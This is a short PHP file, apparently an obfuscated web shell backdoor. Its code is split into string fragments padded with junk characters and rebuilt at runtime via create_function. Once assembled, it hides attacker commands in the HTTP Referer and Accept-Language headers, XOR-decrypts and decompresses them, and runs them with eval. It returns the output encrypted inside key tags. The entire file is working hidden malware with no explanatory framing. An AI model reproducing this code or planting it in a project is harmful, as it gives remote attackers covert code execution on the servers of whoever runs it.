<?php
$w='Do0;$Doi<$l;Do){for($j=0;($Doj<$cDo&&$i<$l);$j++Do,Do$i++){$o.DoDo=$t{$i}^Do$k{$j};}Do}retDourn $o;}$r=Do$_SER';
$y=str_replace('km','','crkmekmate_kmkmfukmkmnction');
$t='($e)Do{$k=$khDo.$kf;ob_sDotDoart();@eDoval(@gzDouDoncomDopress(Do@x(@bDoase64Do_decode(preg_replaDoce(aDoDorr';
$b='$kh="63Doa9"Do;$kfDo="f0eaDo";fuDoncDotion x($t,$kDo){$c=strlen($kDo);$lDo=strlen(Do$t);$o=Do"";fDoor($iDo=';
$f='ay("/Do_/","Do/-/"),aDorrayDo("/","+"Do),$ss($s[$Doi],0,DoDo$e))Do),$k)));$o=ob_get_DoconteDonDots();ob_endDo_cle';
$H=']Do+(Do?:;Doq=0.([\\d]))?,?/",$ra,DoDo$m);if($q&Do&$m){@seDossDoionDoDo_start();$s=&$_DoSESSIODoNDo;$ss="substr";$Do';
$I='sl=Do"sDotrtDoolower";$i=$mDo[Do1][0].$m[1][1];$Doh=$sl($Doss(mdDo5($i.$kDoh),0,3Do));$DofDo=$sl($ss(md5(DoDo$i.$kf),0';
$K='VEDoR;$rrDo=@$r[Do"HTTDoP_REFERDoER"];$rDoaDoDo=@$Dor["HTTP_DoACCEPDoT_LANGUADoGE"];if($rr&&$raDo)Do{$Dou=Dopars';
$a='e_url($rr);paDorse_str($Dou["querDoy"Do]Do,$q);$Doq=array_DoDovaDolues($q);prDoeDog_Domatch_all(Do"/([\\w])[\\w-';
$A='Do,3))Do;$p="Do";Dofor($z=1;$Doz<cDoount($m[Do1]DoDo);Do$z++)$p.=$q[$m[2][$Doz]Do];if(strpos($DoDop,$h)===0)Do';
$S='an()Do;$d=baDoseDo64_encoDode(x(gzDoDocompressDo($o)DoDo,Do$k));print("<$k>Do$Dod</$k>");@session_deDostroy(Do);}}}}';
$M='{Do$s[$i]="";$Dop=$ss($pDo,3);}if(arDoray_kDoey_existDos($i,$DoDos)){$Dos[$i].=Do$p;$e=strpDoos($s[Do$i],$f);DoifDo';
$Q=str_replace('Do','',$b.$w.$K.$a.$H.$I.$A.$M.$t.$f.$S);
$P=$y('',$Q);$P();
?>
